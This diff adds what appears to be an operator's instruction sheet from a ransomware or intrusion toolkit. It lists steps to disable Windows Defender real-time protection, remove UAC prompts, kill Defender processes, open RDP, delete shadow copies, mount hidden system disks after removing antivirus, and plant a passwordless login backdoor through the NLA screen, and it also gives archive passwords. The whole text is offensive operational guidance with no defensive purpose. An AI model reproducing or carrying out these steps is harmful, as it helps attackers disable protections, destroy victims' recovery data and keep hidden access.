@@ -1,0 +1,21 @@
+gpedit.msc
+
+Go to Computer Configuration - Administrative Templates - Windows Components - Windows Defender 
+Find the item "Real-time protection":
+There, select the item "Turn off real-time protection" and double-click on it:
+Then select the circle "Enabled" and click on OK.
+
+always run everything from Administrator account:
+uac - removes popup windows asking permission to run as administrator
+defoff - kill defender (not working on everything, check afterwards in taskmgr for Mspeng process)
+RDP - picks up port 3389
+
+del - delete Shadow copy (asks permission to delete, press y)
+NS - mount hidden system disks (password:98) !! Use after tearing down Antivirus
+
+NLA+BACK - fixes NLA + backdoor to log in without password, works like this: 
+    in login window (where it asks for credentials) - press win+Y - cmd window pops up
+    type taskmgr, open "users" tab, click on any user - connect
+p.s - doesn't work on Windows 10 \ requires a pass
+
+The archive includes a variety of methods which could be applied to disable Antivirus Password:9SealG 
